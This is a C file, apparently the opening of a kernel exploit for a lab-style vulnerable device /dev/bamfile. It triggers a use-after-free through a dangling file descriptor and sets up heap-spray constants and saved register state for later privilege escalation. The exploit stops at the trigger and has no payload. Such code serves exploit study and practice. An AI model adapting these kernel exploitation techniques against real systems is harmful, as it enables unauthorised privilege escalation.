#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <linux/dma-buf.h>
#include <linux/dma-heap.h>

#define FILP_SPRAY 0x100
#define PTE_SPRAY

static void set_cpu_affinity(int cpu_id) {

    cpu_set_t mask;

    CPU_ZERO(&mask); // clear the CPU set
    CPU_SET(cpu_id, &mask); // set the bit that represents CPU x

    if (sched_setaffinity(0, sizeof(cpu_set_t), &mask) == -1) {
        perror("sched_setaffinity");
        exit(1); 
    } 
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

int main() {
    // Open vulnerable device
    int fd = open("/dev/bamfile", O_RDWR);

    if (fd == -1){
        perror("/dev/bamfile");
        return -1;
    }
    // Get dangling file descriptor
    int ezfd = fd + 1;

    if (ioctl(fd, 0, 0xdeadbeef) == 0){
        perror("ioctl did not fail");
    }
    // Use-after-free
    char buf[4];
    read(ezfd, buf, 4);
    return 0;
}
